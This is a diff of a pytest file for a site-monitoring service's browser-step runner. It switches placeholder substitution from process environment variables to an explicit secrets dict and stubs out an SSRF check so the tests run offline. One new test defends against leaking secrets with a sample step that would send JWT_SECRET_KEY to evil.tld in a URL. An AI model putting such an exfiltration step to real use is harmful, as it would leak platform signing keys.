@@ -5,34 +5,38 @@ from app.services.checks import (
     PlaywrightBrowserRunner,
     StepFailure,
     execute_steps,
-    resolve_env_placeholders,
+    resolve_placeholders,
 )
 from app.services.config_sync import dump_config, parse_config
 
 
-# --- resolve_env_placeholders ---
+# --- resolve_placeholders ---
 
 
-def test_resolve_env_placeholders_substitutes(monkeypatch):
-    monkeypatch.setenv("MONITOR_PASSWORD", "s3cret")
+def test_resolve_placeholders_substitutes():
     step = {"action": "type", "selector": "#password", "value": "${MONITOR_PASSWORD}"}
-    resolved = resolve_env_placeholders(step)
+    resolved = resolve_placeholders(step, {"MONITOR_PASSWORD": "s3cret"})
     assert resolved["value"] == "s3cret"
     # исходный шаг не мутируется
     assert step["value"] == "${MONITOR_PASSWORD}"
 
 
-def test_resolve_env_placeholders_multiple_vars_in_one_string(monkeypatch):
-    monkeypatch.setenv("HOST", "example.com")
-    monkeypatch.setenv("PATH_PART", "login")
+def test_resolve_placeholders_multiple_vars_in_one_string():
     step = {"action": "goto", "url": "https://${HOST}/${PATH_PART}"}
-    assert resolve_env_placeholders(step)["url"] == "https://example.com/login"
+    secrets = {"HOST": "example.com", "PATH_PART": "login"}
+    assert resolve_placeholders(step, secrets)["url"] == "https://example.com/login"
 
 
-def test_resolve_env_placeholders_missing_var(monkeypatch):
-    monkeypatch.delenv("MISSING_VAR", raising=False)
-    with pytest.raises(ValueError, match="environment variable 'MISSING_VAR' is not set"):
-        resolve_env_placeholders({"action": "type", "selector": "#x", "value": "${MISSING_VAR}"})
+def test_resolve_placeholders_missing_secret():
+    with pytest.raises(ValueError, match="secret 'MISSING_VAR' is not defined"):
+        resolve_placeholders({"action": "type", "selector": "#x", "value": "${MISSING_VAR}"}, {})
+
+
+def test_resolve_placeholders_ignores_process_environment(monkeypatch):
+    # ключи платформы живут в окружении воркера: сценарий не должен их видеть
+    monkeypatch.setenv("JWT_SECRET_KEY", "platform-signing-key")
+    with pytest.raises(ValueError, match="secret 'JWT_SECRET_KEY' is not defined"):
+        resolve_placeholders({"action": "goto", "url": "https://evil.tld/?x=${JWT_SECRET_KEY}"}, {})
 
 
 # --- execute_steps с FakePage ---
@@ -78,7 +82,10 @@ class FakePage:
 
 
 @pytest.mark.asyncio
-async def test_execute_steps_happy_path_all_actions():
+async def test_execute_steps_happy_path_all_actions(monkeypatch):
+    # шаг goto резолвит хост через DNS (SSRF-проверка) — тест про диспетчеризацию
+    # шагов не должен зависеть от сети: без этого он падает офлайн и в CI без DNS
+    monkeypatch.setattr("app.services.checks.validate_public_url", lambda *a, **kw: None)
     page = FakePage(content_text="Welcome back", inner_texts={"h1": "Dashboard"}, url="https://example.com/dashboard")
     steps = [
         {"action": "goto", "url": "https://example.com/login"},
@@ -166,6 +173,9 @@ def patch_playwright(monkeypatch, browser):
             return False
 
     monkeypatch.setattr("playwright.async_api.async_playwright", lambda: FakeContext())
+    # шаг goto резолвит хост через DNS (SSRF-проверка): тесты раннера про
+    # диспетчеризацию шагов, а не про сеть — иначе они падают офлайн
+    monkeypatch.setattr("app.services.checks.validate_public_url", lambda *a, **kw: None)
 
 
 def make_browser_task(steps):
@@ -187,7 +197,8 @@ async def test_runner_success_details_final_url(monkeypatch):
     patch_playwright(monkeypatch, browser)
 
     result = await PlaywrightBrowserRunner().run(
-        make_browser_task([{"action": "goto", "url": "https://example.com/login"}, {"action": "assert_url", "contains": "dashboard"}])
+        make_browser_task([{"action": "goto", "url": "https://example.com/login"}, {"action": "assert_url", "contains": "dashboard"}]),
+        {},
     )
     assert result["status"] == "up"
     assert result["error"] is None
@@ -203,7 +214,8 @@ async def test_runner_failure_details_failed_step(monkeypatch):
     patch_playwright(monkeypatch, browser)
 
     result = await PlaywrightBrowserRunner().run(
-        make_browser_task([{"action": "goto", "url": "https://example.com/login"}, {"action": "assert_url", "contains": "dashboard"}])
+        make_browser_task([{"action": "goto", "url": "https://example.com/login"}, {"action": "assert_url", "contains": "dashboard"}]),
+        {},
     )
     assert result["status"] == "down"
     assert result["response_time_ms"] is None
@@ -220,7 +232,7 @@ async def test_runner_failure_on_unknown_action(monkeypatch):
     browser = FakeBrowser(page)
     patch_playwright(monkeypatch, browser)
 
-    result = await PlaywrightBrowserRunner().run(make_browser_task([{"action": "hover", "selector": "#x"}]))
+    result = await PlaywrightBrowserRunner().run(make_browser_task([{"action": "hover", "selector": "#x"}]), {})
     assert result["status"] == "down"
     assert result["details"]["failed_step"] == {"index": 1, "action": "hover", "selector": "#x"}
 
